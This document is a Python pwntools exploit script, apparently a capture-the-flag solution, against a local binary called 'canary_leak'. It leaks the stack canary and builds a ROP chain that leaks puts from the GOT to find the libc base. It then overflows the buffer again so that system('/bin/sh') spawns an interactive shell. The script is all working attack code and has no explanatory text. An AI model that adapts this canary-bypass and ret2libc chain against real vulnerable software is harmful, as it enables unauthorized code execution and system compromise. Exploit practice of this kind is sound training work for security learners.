#!/usr/bin/python
from pwn import *
context.arch = "amd64"

p = process("./canary_leak")
e = ELF("./canary_leak")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# leak the stack canary
p.readuntil("card:\n")
p.sendline("13")
p.readuntil("number ")
canary = int(p.readuntil(".")[:-1])
log.info("leaked canary: 0x{:>8x}".format(canary))

# leak puts address
rop = ROP(e)
rop.puts(e.got["puts"])
rop.main()
p.readuntil("name?\n")
p.sendline("A" * 40 + p64(canary) + p64(0xdeadbeef) + str(rop))
p.readuntil("week.\n")
puts_leak = u64(p.read(6) + "\x00\x00")
libc.address = puts_leak - libc.symbols["puts"]
bin_sh_address = libc.search("/bin/sh").next()

log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
log.info("found libc base address: 0x{:>8x}".format(libc.address))
log.info("found system address: 0x{:>8x}".format(libc.symbols["system"]))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

# spawn a shell
p.readuntil("card:\n")
p.sendline()
p.readuntil("name?\n")

rop = ROP(libc)
rop.system(bin_sh_address)
p.sendline("A" * 40 + p64(canary) + p64(0xdeadbeef) + str(rop))

p.interactive()
